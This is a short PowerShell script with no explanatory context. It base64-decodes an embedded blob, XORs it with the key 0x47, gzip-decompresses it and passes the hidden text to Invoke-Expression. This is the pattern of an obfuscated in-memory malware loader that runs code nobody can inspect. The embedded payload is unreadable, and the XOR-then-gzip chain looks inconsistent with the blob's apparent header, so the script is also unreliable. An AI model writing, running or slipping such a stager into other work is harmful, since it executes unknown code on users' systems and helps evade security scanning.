$compressedData = [Convert]::FromBase64String("eJx9kM0OgjAMhu/9ijuSkQwYufgFgxcSosJhMyD2r4vjprC4NPVJ37z91hkAQMBC1pVLpTIdh1y3lCBfFh+KYv9k08yWqzw8q7m85yW7tlRDUV5Cdhp0zzIX14c8RppaqUqkI9LFi3Qe0PQR6wU4HpogMHZCeF3ZPxr4Yl3mSMsNl9rAFhGTWIlqPllqX32iNTG4IyM6j5p9DNN1V6w55M7Nz2cyKj/x1g/LsDUxT3PFmhPHyUG2vkvL4jsDb6qf")
$key = 0x47

for ($i = 0; $i -lt $compressedData.Length; $i++) {
    $compressedData[$i] = $compressedData[$i] -bxor $key
}

$ms = New-Object System.IO.MemoryStream(,$compressedData)
$gs = New-Object System.IO.Compression.GzipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($gs)
$decodedScript = $sr.ReadToEnd()
$sr.Close()
$gs.Close()
$ms.Close()

Invoke-Expression $decodedScript
